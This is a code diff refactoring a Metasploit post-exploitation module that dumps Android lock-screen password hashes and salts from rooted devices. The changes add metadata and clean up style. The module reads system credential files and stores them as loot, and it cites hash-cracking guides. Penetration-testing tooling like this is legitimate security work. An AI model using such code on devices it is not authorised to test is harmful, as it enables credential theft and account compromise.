@@ -15,23 +15,26 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        {
-          'Name' => 'Android Gather Dump Password Hashes for Android Systems',
-          'Description' => %q{
-            Post Module to dump the password hashes for Android System. Root is required.
-            To perform this operation, two things are needed.  First, a password.key file
-            is required as this contains the hash but no salt.  Next, a sqlite3 database
-            is needed (with supporting files) to pull the salt from.  Combined, this
-            creates the hash we need.  Samsung based devices change the hash slightly.
-          },
-          'License' => MSF_LICENSE,
-          'Author' => ['h00die', 'timwr'],
-          'SessionTypes' => [ 'meterpreter', 'shell' ],
-          'Platform' => 'android',
-          'References' => [
-            ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],
-            ['URL', 'https://hashcat.net/forum/thread-2202.html'],
-          ]
+        'Name' => 'Android Gather Dump Password Hashes for Android Systems',
+        'Description' => %q{
+          Post Module to dump the password hashes for Android System. Root is required.
+          To perform this operation, two things are needed.  First, a password.key file
+          is required as this contains the hash but no salt.  Next, a sqlite3 database
+          is needed (with supporting files) to pull the salt from.  Combined, this
+          creates the hash we need.  Samsung based devices change the hash slightly.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['h00die', 'timwr'],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Platform' => 'android',
+        'References' => [
+          ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],
+          ['URL', 'https://hashcat.net/forum/thread-2202.html'],
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -44,21 +47,20 @@ class MetasploitModule < Msf::Post
     file_name = File.basename(location)
     ['', '-wal', '-shm'].each do |ext|
       l = location + ext
-      unless file_exist?(l)
-        next
-      end
+      next unless file_exist?(l)
 
       f = file_name + ext
       data = read_file(l)
+
       if data.blank?
         print_error("Unable to read #{l}")
-        return
+        next
       end
+
       print_good("Saved #{f} with length #{data.length}")
 
       if ext == ''
-        loot_file = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
-        db_loot_name = loot_file
+        db_loot_name = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
         next
       end
 
@@ -70,12 +72,13 @@ class MetasploitModule < Msf::Post
       new_name = "#{db_loot_name}#{ext}"
       FileUtils.mv(loot_file, new_name)
     end
+
     SQLite3::Database.new(db_loot_name)
   end
 
   def run
     unless is_root?
-      fail_with Failure::NoAccess, 'This module requires root permissions.'
+      fail_with(Failure::NoAccess, 'This module requires root permissions.')
     end
 
     manu = cmd_exec('getprop ro.product.manufacturer')
